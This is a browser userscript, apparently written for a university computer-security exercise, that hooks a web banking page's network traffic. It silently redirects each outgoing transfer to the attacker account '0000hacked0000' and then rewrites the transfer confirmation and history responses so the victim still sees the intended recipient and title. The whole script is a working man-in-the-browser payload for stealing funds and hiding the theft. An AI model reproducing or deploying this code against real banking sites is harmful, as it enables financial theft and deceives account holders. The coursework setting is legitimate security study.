// ==UserScript==
// @name        Bezpieczenstwo komputerowe lista 4 zadanie 2
// @namespace   asd
...
var my_acc = "0000hacked0000";

var transfer_history = JSON.parse(localStorage.thx || "[]");
var hre = /^HACK#(\d+)$/;



xhook.after((request, response) => {
  if (request.url.match(/history/)) {
      var hist = JSON.parse(response.text);
      for (var el of hist.transactions) {
          var matches = el.title.match(hre);
          if (matches) {
              var histel = transfer_history[parseInt(matches[1])];
              el.title = histel.title;
              el.account = histel.account;
          }
      }
    response.text = JSON.stringify(hist);
  } else if (request.url.match(/transfer/)) {
      var res = JSON.parse(response.text);
      var matches = res.title.match(hre);
      if (matches) {
              var histel = transfer_history[parseInt(matches[1])];
              res.title = histel.title;
              res.account = histel.account;
      }
...
xhook.before((request) => {
    if (request.url.match(/transfer/)) {
        var req = JSON.parse(request.body);
        var i = transfer_history.length;
        transfer_history.push({title: req.title, account: req.account});
        localStorage.thx = JSON.stringify(transfer_history);
        req.title = "HACK#"+i;
        req.account = my_acc;
